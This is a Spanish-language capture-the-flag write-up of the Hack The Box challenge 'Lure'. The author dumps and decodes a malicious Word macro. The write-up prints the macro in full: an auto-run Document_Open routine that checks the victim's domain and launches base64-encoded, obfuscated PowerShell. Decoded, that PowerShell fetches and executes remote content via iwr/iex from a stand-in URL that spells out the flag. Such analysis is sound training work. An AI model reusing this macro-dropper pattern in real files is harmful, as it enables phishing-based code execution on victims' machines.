# Lure
*The finance team received an important looking email containing an attached Word document. Can you take a look and confirm if it's malicious?*

Bien, nada mas intentar abrir el archivo con el LibreOffice nos avisa de que hay macros (recuerden niños desactiven la ejecución de macros), dado que yo trabajo desde Linux voy a usar olevba para dumpear las macros
```
olevba UrgentPayment.doc -c
```
Veamos la macro
```vba
Sub Document_Open()
'
' Document_Open Macro
'
'

Dim chkUserDomain As String
Dim strUserDomain As String

chkUserDomain = "MEGABANK.LOCAL"
strUserDomain = Environ$("UserDomain")

If chkUserDomain <> strUserDomain Then

Else

Dim ExecFile As Double
    ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)

End If
  
End Sub
```
Veamos la siguiente linea:
```vba
ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)
```
Esta ejecutando un comando en powershell, si decodificamos el b64 y quitamos los puuntos intermedios:
```
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//owly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```
Veamos esto:
```
$(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//owly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U"))
```
Si metemos ese comando en [este](https://tio.run/#powershell) inteprete online obtenemos la siguiente string:
```
http://owly/HTB%7Bk4REfUl_w1Th_Y0UR_d0CuMeNT5%7D
```
Si decodificamos url encode:
```
http://owly/HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}
```
Flag **HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}**
